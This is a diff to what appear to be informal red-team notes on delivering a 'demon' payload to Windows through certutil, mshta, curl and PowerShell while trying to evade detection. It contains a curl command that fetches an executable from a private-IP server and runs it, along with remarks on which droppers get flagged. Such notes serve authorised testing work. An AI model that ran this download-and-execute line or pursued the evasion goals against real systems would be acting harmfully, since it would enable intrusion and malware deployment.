@@ -265,6 +265,8 @@ using certutil.exe  tp download
 
 not working
 
+`curl -s http://10.10.6.56:8000/demon_ht.exe | start demon.exe`
+
 from lolbas mshta download and execute exploit was searched
 
 however it was found tha tmshta doesnot work so instead we tried executing the binary itself.
@@ -296,18 +298,31 @@ when trying to load demon_ht through mshta it evades detection as well however t
 
 ![](./error_in_mshta_powershell.png)
 
-mshta dropper doe not work with
 
-curl -s http://10.10.6.56:8000/demon_ht.exe | start demon.exe
+## problems with mshat dropper 
+
+objshell.run - down't seems to run always
+
+mshta dropper does not work with
+
 
 1. certutil doesnt work
 2. Curl doesnt work
 3. powershell normal - in memory execution
+    > powershell encoding should we check?
 
 works with mshta but not in exploit
 bitstransfer is not able to find the file however when put as document in powershell
 
-powershel encoding should we check?
+able to load the doc with payload using certutil
+![](./certutil_detected.png)
+
+however even mshta command to download using certutil is flagged.
+
+I need look for means to execute the test.html using mshta without being flagged.
+
+
+
 
 
 
